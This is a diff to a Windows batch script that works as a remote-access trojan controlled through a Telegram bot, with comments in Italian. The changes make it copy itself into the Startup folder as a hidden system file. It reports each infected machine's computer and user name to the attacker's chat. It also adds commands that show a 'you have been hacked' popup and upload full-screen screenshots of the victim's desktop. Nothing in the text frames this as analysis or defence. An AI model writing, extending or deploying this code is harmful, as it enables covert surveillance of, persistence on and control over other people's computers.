@@ -14,17 +14,23 @@ set "CHAT_ID=5709299213"
 set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
 set "URL_FILE=%TEMP%\last_url.txt"
 set "PROCESSED_URLS=%TEMP%\processed_urls.txt"
-set "LAST_COMMAND_ID=0"
 
-:: Invia notifica di connessione
+:: Auto-avvio all'accensione del PC
+set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+if not exist "%STARTUP_FOLDER%\remote_controller.bat" (
+    copy "%~f0" "%STARTUP_FOLDER%\"
+    attrib +h +s "%STARTUP_FOLDER%\remote_controller.bat"
+)
+
+:: Invia notifica di connessione e ottieni l'ultimo update_id
+for /f "tokens=*" %%A in ('curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" ^| powershell -command "$json=ConvertFrom-Json ($input); if($json.ok -and $json.result) { $json.result[-1].update_id } else { 0 }"') do (
+    set "LAST_COMMAND_ID=%%A"
+)
+
+:: Notifica connessione
 curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%)"
-
-:: Aggiungi all'avvio automatico
-if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
-    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-)
 
 :: Verifica/installa curl
 where curl >nul 2>&1 || (
@@ -42,11 +48,11 @@ if not exist "%PROCESSED_URLS%" (
 
 :: Loop principale
 :command_loop
-:: Controlla nuovi messaggi
+:: Controlla SOLO nuovi messaggi
 curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_COMMAND_ID%" > "%TEMP%\updates.json"
 
 :: Estrai comandi dai messaggi
-for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text -and $_.update_id -gt %LAST_COMMAND_ID%){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}"') do (
+for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok -and $json.result){$json.result|ForEach-Object{if($_.update_id -gt %LAST_COMMAND_ID%){$LAST_COMMAND_ID=$_.update_id; if($_.message.text){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}}"') do (
     set "update_data=%%A"
     set "LAST_COMMAND_ID=!update_data:*:=!"
     set "command=!update_data:*:=!"
@@ -60,10 +66,25 @@ for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\update
         exit
     )
     
-    if /i "!command!" == "apri" (
+    if /i "!command!" == "pop" (
         :: Mostra popup "Sei stato hackerato"
         powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('SEI STATO HACKERATO','ATTENZIONE',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
         
+        :: Conferma l'esecuzione
+        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
+            -d "chat_id=%CHAT_ID%" ^
+            -d "text=💀 Popup mostrato su %COMPUTERNAME%"
+    )
+    
+    if /i "!command!" == "foto" (
+        :: Cattura screenshot
+        call :capture_screen
+        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
+            -d "chat_id=%CHAT_ID%" ^
+            -d "text=📸 Screenshot catturato da %COMPUTERNAME%"
+    )
+    
+    if /i "!command!" == "apri" (
         :: Apri l'ultimo URL solo se non è già stato processato
         if exist "%URL_FILE%" (
             set /p last_url=<"%URL_FILE%"
@@ -122,15 +143,15 @@ call :capture_screen
 exit /b
 
 :capture_screen
-:: Cattura finestra attiva (Alt+Stamp)
-powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('%{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
+:: Cattura schermo intero (Print Screen)
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
 
 :: Invia screenshot
 if exist "%SCREENSHOT_PATH%" (
     curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
         -F chat_id=%CHAT_ID% ^
         -F photo=@"%SCREENSHOT_PATH%" ^
-        -F caption="🖥️ %COMPUTERNAME%: Finestra attiva"
+        -F caption="🖥️ %COMPUTERNAME%: Schermo intero"
     del "%SCREENSHOT_PATH%" >nul
 )
 exit /b
